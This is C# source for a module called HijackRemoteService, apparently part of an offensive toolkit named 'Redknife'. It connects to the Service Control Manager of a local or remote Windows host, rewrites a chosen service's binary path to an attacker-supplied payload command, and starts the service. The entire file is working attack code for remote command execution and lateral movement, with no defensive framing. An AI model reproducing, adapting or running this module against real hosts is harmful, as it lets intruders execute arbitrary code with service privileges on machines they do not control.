using System;
using System.Diagnostics;

using Redknife.APIs;
using Redknife.Util;

namespace Redknife.Modules
{
    public class HijackRemoteService : BaseModule
    {

        public override void Validate()
        {
            // Validate we have a service name specified
            if (this.Args.ServiceName == null)
            {
                throw new Exception("No service name specified");
            }
        }

        public override void Run()
        {
            string targetHost = "localhost";
            if (this.Args.HostName != null)
            {
                targetHost = this.Args.HostName;
            }

            string payloadStr = System.Text.Encoding.ASCII.GetString(this.Payload);
            ProcessStartInfo procInfo = this.GetProcessStartInfo(payloadStr);

            LogUtil.Info("Attempting to reconfigure service '{0}' on host '{1}' - binary path: {2}", 0, this.Args.ServiceName, targetHost, payloadStr);

            // Open SC manager on remote host
            LogUtil.Debug("Opening SC manager on host", 1);
            IntPtr SCMHandle = Advapi32.OpenSCManager(targetHost, null, 0xF003F);
            LogUtil.Debug("SCMHandle: {0}", 2, SCMHandle);

            // Ensure we have a handle to SC manager
            if (SCMHandle == IntPtr.Zero)
            {
                LogUtil.Error("Couldn't get a handle to the host's SC Manager (this could be a permission issue, or SC manager might not allow remote connections)", 1);
                throw new Exception("Couldn't get a handle to the host's SC Manager");
            }

            // Open the SensorService
            LogUtil.Debug("Opening Service", 1);
            IntPtr schService = Advapi32.OpenService(SCMHandle, this.Args.ServiceName, 0xF01FF);
            LogUtil.Debug("schService: {0}", 2, schService);

            if (schService == IntPtr.Zero)
            {
                LogUtil.Error("Couldn't get a handle to the specified service", 1);
                throw new Exception("Couldn't get a handle to the specified service");
            }

            // Change service binary to notepad.exe
            //LogUtil.Debug("Reconfiguring service binary (executable: {0}, args: {1})", 1, procInfo.FileName, procInfo.Arguments);
            //bool bResult = Advapi32.ChangeServiceConfigA(schService, 0xffffffff, 3, 0, procInfo.FileName, null, null, null, null, null, null);
            LogUtil.Debug("Reconfiguring service binary (executable: {0})", 1, payloadStr);
            bool bResult = Advapi32.ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payloadStr, null, null, null, null, null, null);
            LogUtil.Debug("bResult: {0}", 2, bResult);

            if (!bResult)
            {
                LogUtil.Error("Couldn't reconfigure the specified service", 1);
                throw new Exception("Couldn't reconfigure the specified service");
            }

            // Start the service
            LogUtil.Debug("Starting the service", 1);
            //if (string.IsNullOrEmpty(procInfo.Arguments))
            //{
                // start service with no arguments
                bResult = Advapi32.StartService(schService, 0, null);
            //}
            //else
            //{
            //    string[] args = { procInfo.Arguments };
            //    bResult = Advapi32.StartService(schService, args.Length, args);
            //}
            LogUtil.Debug("bResult: {0}", 2, bResult);

            if (!bResult)
            {
                LogUtil.Error("Couldn't start the specified service", 1);
                throw new Exception("Couldn't start the specified service");
            }
        }

        protected ProcessStartInfo GetProcessStartInfo(string payloadStr)
        {
            ProcessStartInfo processInfo = null;
            try
            {
                processInfo = ProcessUtil.ParseCommandLineAsProcessInfo(payloadStr);
            }
            catch (Exception ex)
            {
                LogUtil.Error("Could not parse command line executable/args from string: {0}", 0, payloadStr);
                LogUtil.Error(ex.ToString(), 1);
                throw ex;
            }
            return processInfo;
        }

    }
}
